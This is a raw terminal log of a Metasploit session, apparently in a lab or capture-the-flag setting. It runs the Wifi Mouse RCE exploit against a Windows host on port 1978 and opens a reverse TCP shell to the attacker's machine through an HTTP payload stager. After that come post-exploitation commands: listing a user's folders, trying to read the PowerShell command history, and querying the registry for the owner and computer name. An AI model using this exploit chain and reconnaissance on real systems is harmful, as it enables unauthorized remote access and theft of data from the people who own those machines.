┌─[root@hackerbox]─[~/Desktop]
└──╼ #msfconsole -q

msf > 
msf > search luminate

Matching Modules
================

   #  Name                                              Disclosure Date  Rank       Check  Description
   -  ----                                              ---------------  ----       -----  -----------
   0  exploit/unix/http/laravel_token_unserialize_exec  2018-08-07       excellent  Yes    PHP Laravel Framework token Unserialize Remote Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/http/laravel_token_unserialize_exec

msf > search type:exploit platform:windows port:1978

Matching Modules
================

   #  Name                                   Disclosure Date  Rank    Check  Description
   -  ----                                   ---------------  ----    -----  -----------
   0  exploit/windows/misc/remote_mouse_rce  2019-04-15       normal  Yes    Remote Mouse RCE
   1  exploit/windows/misc/wifi_mouse_rce    2021-02-25       normal  No     Wifi Mouse RCE


Interact with a module by name or index. For example info 1, use 1 or use exploit/windows/misc/wifi_mouse_rce

msf > use exploit/windows/misc/wifi_mouse_rce
[*] Using configured payload windows/shell/reverse_tcp
msf exploit(windows/misc/wifi_mouse_rce) > set RHOSTS 172.20.12.139
RHOSTS => 172.20.12.139
msf exploit(windows/misc/wifi_mouse_rce) > set LHOST 172.20.12.152
LHOST => 172.20.12.152
msf exploit(windows/misc/wifi_mouse_rce) > run
[*] Started reverse TCP handler on 172.20.12.152:4444 
[*] 172.20.12.139:1978 - Opening command prompt
[*] 172.20.12.139:1978 - Typing out payload
[*] 172.20.12.139:1978 - Using URL: http://172.20.12.152:8080/HHOa0SfXUkx3H
[*] 172.20.12.139:1978 - Command Stager progress - 100.00% done (152/152 bytes)
[*] 172.20.12.139:1978 - Server stopped.
[*] Exploit completed, but no session was created.
msf exploit(windows/misc/wifi_mouse_rce) > msf exploit(windows/misc/wifi_mouse_rce) > set payload windows/shell_reverse_tcp
[-] Unknown command: msf. Run the help command for more details.
msf exploit(windows/misc/wifi_mouse_rce) > msf exploit(windows/misc/wifi_mouse_rce) > set LHOST 172.20.12.152
[-] Unknown command: msf. Run the help command for more details.
msf exploit(windows/misc/wifi_mouse_rce) > msf exploit(windows/misc/wifi_mouse_rce) > set LPORT 4444
[-] Unknown command: msf. Run the help command for more details.
msf exploit(windows/misc/wifi_mouse_rce) > msf exploit(windows/misc/wifi_mouse_rce) > run
[-] Unknown command: msf. Run the help command for more details.
msf exploit(windows/misc/wifi_mouse_rce) > set payload windows/shell_reverse_tcp
payload => windows/shell_reverse_tcp
msf exploit(windows/misc/wifi_mouse_rce) > set LHOST 172.20.12.152
LHOST => 172.20.12.152
msf exploit(windows/misc/wifi_mouse_rce) > set LPORT 4444
LPORT => 4444
msf exploit(windows/misc/wifi_mouse_rce) > run
[*] Started reverse TCP handler on 172.20.12.152:4444 
[*] 172.20.12.139:1978 - Opening command prompt
[*] 172.20.12.139:1978 - Typing out payload
[*] 172.20.12.139:1978 - Using URL: http://172.20.12.152:8080/OxC5Raz
[*] 172.20.12.139:1978 - Command Stager progress - 100.00% done (146/146 bytes)
[*] 172.20.12.139:1978 - Client 172.20.12.139 (Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.3930) requested /OxC5Raz
[*] 172.20.12.139:1978 - Sending payload to 172.20.12.139 (Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.3930)
[*] Command shell session 1 opened (172.20.12.152:4444 -> 172.20.12.139:50643) at 2026-05-09 15:45:26 -0500
[*] 172.20.12.139:1978 - Server stopped.


Shell Banner:
Microsoft Windows [Version 10.0.19045.3930]
-----
          

C:\Windows\system32>type C:\Windows\System32\drivers\etc\hosts
type C:\Windows\System32\drivers\etc\hosts
Copyright (c) 1993-2009 Microsoft Corp.

# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to host names. Each
# entry should be kept on an individual line. The IP address should
# be placed in the first column followed by the corresponding host name.
# The IP address and the host name should be separated by at least one
# space.
#
# Additionally, comments (such as these) may be inserted on individual
# lines or following the machine name denoted by a '#' symbol.
#
# For example:
#
#      102.54.94.97     rhino.acme.com          # source server
#       38.25.63.10     x.acme.com              # x client host

# localhost name resolution is handled within DNS itself.
#	127.0.0.1       localhost
#	::1             localhost

C:\Windows\system32>dir C:\Users\Harry\Desktop
dir C:\Users\Harry\Desktop
 Volume in drive C has no label.
 Volume Serial Number is DACA-C6D3

 Directory of C:\Users\Harry\Desktop

02/05/2024  10:03 AM    <DIR>          .
02/05/2024  10:03 AM    <DIR>          ..
02/05/2024  09:53 AM           443,723 bookmarks_1_17_24.html
02/05/2024  09:48 AM             2,320 Burp Suite Community Edition.lnk
02/05/2024  09:59 AM            19,302 burp-parameter-names.txt
02/05/2024  10:03 AM    <DIR>          fuzzing
02/05/2024  09:49 AM               116 Hackviser.url
02/05/2024  09:44 AM         4,089,288 response.txt
02/05/2024  09:48 AM             1,032 Telegram.lnk
02/05/2024  09:44 AM                23 telegram.txt
02/05/2024  10:00 AM    <DIR>          wordlists
               7 File(s)      4,555,804 bytes
               4 Dir(s)  15,946,104,832 bytes free

C:\Windows\system32>dir C:\Users\Harry\Documents
dir C:\Users\Harry\Documents
 Volume in drive C has no label.
 Volume Serial Number is DACA-C6D3

 Directory of C:\Users\Harry\Documents

02/05/2024  10:03 AM    <DIR>          .
02/05/2024  10:03 AM    <DIR>          ..
02/05/2024  10:03 AM    <DIR>          hack
               0 File(s)              0 bytes
               3 Dir(s)  15,946,104,832 bytes free

C:\Windows\system32>type C:\Users\Harry\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
type C:\Users\Harry\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
The system cannot find the path specified.

C:\Windows\system32>ipconfig /displaydns | findstr ".hv"
ipconfig /displaydns | findstr ".hv"

C:\Windows\system32>reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion" /v RegisteredOwner
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion" /v RegisteredOwner

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion
    RegisteredOwner    REG_SZ    Harry


C:\Windows\system32>reg query "HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ActiveComputerName"
reg query "HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ActiveComputerName"

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ComputerName\ActiveComputerName
    ComputerName    REG_SZ    DESKTOP-BG4O059


C:\Windows\system32>
